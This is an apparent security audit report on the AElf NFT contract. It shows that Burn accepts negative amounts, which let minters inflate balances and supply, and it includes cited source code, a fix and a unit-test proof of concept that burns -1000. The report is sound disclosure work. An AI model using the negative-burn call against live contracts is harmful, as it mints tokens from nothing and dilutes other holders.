# Audit Report

## Title
Negative Amount Bypass in NFT Burn Function Allows Arbitrary Balance Inflation

## Summary
The NFT contract's `Burn` function lacks validation for negative input amounts, allowing minters to inflate their NFT balances and protocol supply through the mathematical behavior of `SafeMath.Sub()` with negative operands. When a negative amount is passed, subtraction becomes addition, enabling unlimited NFT creation beyond protocol constraints.

## Finding Description

The vulnerability exists in the `Burn` function which performs balance modifications without validating that the input amount is positive. [1](#0-0) 

The root cause stems from the `BurnInput` protocol buffer definition using a signed `int64` type for the amount field, allowing negative values. [2](#0-1) 

When a negative amount is provided (e.g., `-1000`), the permission check at lines 90-93 passes because any positive balance is greater than a negative number. Subsequently, the `SafeMath.Sub()` operations at lines 94-96 mathematically perform addition when given a negative operand, inflating the balance, supply, and quantity values.

This behavior is explicitly confirmed by the SafeMath test suite. [3](#0-2) 

While the `DoTransfer` helper function properly validates against negative amounts, [4](#0-3)  the `Burn` function performs direct state manipulation without calling `DoTransfer` or implementing equivalent validation.

In contrast, the MultiToken contract's `Burn` implementation properly validates amounts through `AssertValidToken`, [5](#0-4)  which enforces `amount > 0` validation. [6](#0-5) 

## Impact Explanation

This vulnerability has **CRITICAL** severity with direct financial impact:

**Supply Invariant Violation:**
- Minters can inflate their NFT balance to arbitrary amounts (e.g., from 50 to 1,050 NFTs by passing `-1000`)
- Protocol supply can exceed `TotalSupply` limits, breaking the fundamental scarcity invariant
- Creates NFTs out of thin air without proper minting process

**Economic Impact:**
- Legitimate NFT holders suffer immediate dilution as supply inflates
- Marketplace integrity compromised as supply limits become meaningless  
- Protocol economic model collapses as scarcity-based value is eliminated
- Malicious protocol creators can mint, sell to users, then inflate their holdings and dump on market

This violates the critical token supply invariant requiring correct mint/burn limits and NFT supply constraints.

## Likelihood Explanation

The likelihood of exploitation is **HIGH**:

**Reachable Entry Point:**
The `Burn` function is a public RPC method accessible to any caller meeting preconditions. [7](#0-6) 

**Feasible Preconditions:**
- Attacker must be in the minter list for the NFT protocol
- Minters are added by protocol creators, not system-level trusted entities [8](#0-7) 
- Protocol creators automatically become minters [9](#0-8) 

**Execution Practicality:**
- Single transaction attack with negative amount parameter
- No complex state setup required
- Guaranteed success if caller has positive balance and is a minter

## Recommendation

Add explicit validation to check that the burn amount is positive before performing any state modifications:

```csharp
public override Empty Burn(BurnInput input)
{
    Assert(input.Amount > 0, "Invalid burn amount.");
    
    var tokenHash = CalculateTokenHash(input.Symbol, input.TokenId);
    // ... rest of function
}
```

This matches the validation pattern used in the MultiToken contract's `AssertValidSymbolAndAmount` method and the `DoTransfer` helper function.

## Proof of Concept

```csharp
[Fact]
public async Task NegativeAmountBurnInflatesBalance()
{
    // Setup: Create NFT protocol and mint 50 NFTs to minter
    var symbol = await CreateTest();
    await AddMinterAsync(symbol);
    await MinterNFTContractStub.Mint.SendAsync(new MintInput
    {
        Symbol = symbol,
        Quantity = 50,
        Owner = MinterAddress
    });
    
    var balanceBefore = (await MinterNFTContractStub.GetBalance.CallAsync(
        new GetBalanceInput { Owner = MinterAddress, Symbol = symbol, TokenId = 1 }
    )).Balance;
    balanceBefore.ShouldBe(50);
    
    // Attack: Call Burn with negative amount
    var result = await MinterNFTContractStub.Burn.SendAsync(new BurnInput
    {
        Symbol = symbol,
        TokenId = 1,
        Amount = -1000  // Negative amount
    });
    result.TransactionResult.Status.ShouldBe(TransactionResultStatus.Mined);
    
    // Verify: Balance inflated instead of decreased
    var balanceAfter = (await MinterNFTContractStub.GetBalance.CallAsync(
        new GetBalanceInput { Owner = MinterAddress, Symbol = symbol, TokenId = 1 }
    )).Balance;
    balanceAfter.ShouldBe(1050); // 50 - (-1000) = 1050 NFTs created from thin air!
}
```

### Citations

**File:** contract/AElf.Contracts.NFT/NFTContract_UseChain.cs (L46-55)
```csharp
    private void DoTransfer(Hash tokenHash, Address from, Address to, long amount)
    {
        if (amount < 0) throw new AssertionException("Invalid transfer amount.");

        if (amount == 0) return;

        Assert(State.BalanceMap[tokenHash][from] >= amount, "Insufficient balance.");
        State.BalanceMap[tokenHash][from] = State.BalanceMap[tokenHash][from].Sub(amount);
        State.BalanceMap[tokenHash][to] = State.BalanceMap[tokenHash][to].Add(amount);
    }
```

**File:** contract/AElf.Contracts.NFT/NFTContract_UseChain.cs (L82-111)
```csharp
    public override Empty Burn(BurnInput input)
    {
        var tokenHash = CalculateTokenHash(input.Symbol, input.TokenId);
        var nftInfo = GetNFTInfoByTokenHash(tokenHash);
        var nftProtocolInfo = State.NftProtocolMap[input.Symbol];
        Assert(nftProtocolInfo.IsBurnable,
            $"NFT Protocol {nftProtocolInfo.ProtocolName} of symbol {nftProtocolInfo.Symbol} is not burnable.");
        var minterList = State.MinterListMap[input.Symbol] ?? new MinterList();
        Assert(
            State.BalanceMap[tokenHash][Context.Sender] >= input.Amount &&
            minterList.Value.Contains(Context.Sender),
            "No permission.");
        State.BalanceMap[tokenHash][Context.Sender] = State.BalanceMap[tokenHash][Context.Sender].Sub(input.Amount);
        nftProtocolInfo.Supply = nftProtocolInfo.Supply.Sub(input.Amount);
        nftInfo.Quantity = nftInfo.Quantity.Sub(input.Amount);

        State.NftProtocolMap[input.Symbol] = nftProtocolInfo;
        if (nftInfo.Quantity == 0 && !nftProtocolInfo.IsTokenIdReuse) nftInfo.IsBurned = true;

        State.NftInfoMap[tokenHash] = nftInfo;

        Context.Fire(new Burned
        {
            Burner = Context.Sender,
            Symbol = input.Symbol,
            Amount = input.Amount,
            TokenId = input.TokenId
        });
        return new Empty();
    }
```

**File:** contract/AElf.Contracts.NFT/NFTContract_UseChain.cs (L335-353)
```csharp
    public override Empty AddMinters(AddMintersInput input)
    {
        var protocolInfo = State.NftProtocolMap[input.Symbol];
        Assert(Context.Sender == protocolInfo.Creator, "No permission.");
        var minterList = State.MinterListMap[protocolInfo.Symbol] ?? new MinterList();

        foreach (var minter in input.MinterList.Value)
            if (!minterList.Value.Contains(minter))
                minterList.Value.Add(minter);

        State.MinterListMap[input.Symbol] = minterList;

        Context.Fire(new MinterListAdded
        {
            Symbol = input.Symbol,
            MinterList = input.MinterList
        });
        return new Empty();
    }
```

**File:** protobuf/nft_contract.proto (L45-47)
```text
    // Destroy nfts.
    rpc Burn (BurnInput) returns (google.protobuf.Empty) {
    }
```

**File:** protobuf/nft_contract.proto (L182-186)
```text
message BurnInput {
    string symbol = 1;
    int64 token_id = 2;
    int64 amount = 3;
}
```

**File:** test/AElf.Sdk.CSharp.Tests/SafeMathTests.cs (L23-24)
```csharp
        10.Sub(5).ShouldBe(5);
        10.Sub(-5).ShouldBe(15);
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_Actions.cs (L318-337)
```csharp
    public override Empty Burn(BurnInput input)
    {
        return Burn(Context.Sender, input.Symbol, input.Amount);
    }

    private Empty Burn(Address address, string symbol, long amount)
    {
        var tokenInfo = AssertValidToken(symbol, amount);
        Assert(tokenInfo.IsBurnable, "The token is not burnable.");
        ModifyBalance(address, symbol, -amount);
        tokenInfo.Supply = tokenInfo.Supply.Sub(amount);

        Context.Fire(new Burned
        {
            Burner = address,
            Symbol = symbol,
            Amount = amount
        });
        return new Empty();
    }
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_Helper.cs (L81-86)
```csharp
    private void AssertValidSymbolAndAmount(string symbol, long amount)
    {
        Assert(!string.IsNullOrEmpty(symbol) && IsValidSymbol(symbol),
            "Invalid symbol.");
        Assert(amount > 0, "Invalid amount.");
    }
```

**File:** contract/AElf.Contracts.NFT/NFTContract_Create.cs (L36-38)
```csharp
        var minterList = input.MinterList ?? new MinterList();
        if (!minterList.Value.Contains(creator)) minterList.Value.Add(creator);
        State.MinterListMap[symbol] = minterList;
```
